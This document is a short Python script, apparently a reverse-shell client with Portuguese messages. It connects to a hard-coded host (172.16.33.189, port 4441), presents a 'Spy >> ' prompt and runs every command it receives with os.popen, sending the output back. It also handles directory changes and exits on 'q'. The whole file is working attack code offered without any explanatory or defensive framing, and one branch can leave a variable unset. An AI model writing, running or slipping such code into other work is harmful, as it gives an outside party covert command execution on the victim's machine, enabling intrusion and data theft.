import socket, os

class reverse:
    background = "============= CONNECTED =============\n"

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def receive(self):
        self.result = self.s.recv(1024).decode()
        self.result = self.result.replace('\n', '')
    
    def deliver(self, message):
        self.s.send(message.encode())
    
    def connect(self):
        self.s.connect((self.ip, self.port))
        self.deliver(self.background)

    def close(self):
        self.s.close()


def main():
    shell = reverse('172.16.33.189', 4441)
    shell.connect()
    stay = True
    while stay:
        shell.deliver('Spy >> ')
        shell.receive()

        if ('not found' in shell.result):
            print('teste')

        elif (shell.result.startswith('cd')):
            os.chdir(shell.result[3:])
            sent = "Diretório atual : " + str(os.getcwd()) + '\n'
        elif (shell.result == 'pwd'):
            sent = "Diretório atual : "+ str(os.getcwd()) + '\n'
        elif (shell.result == 'q'):
            sent = "Saindo...\n"
            stay = False
        else:
            sent = os.popen(shell.result).read()
        
        shell.deliver(sent)
    
    shell.close()

main()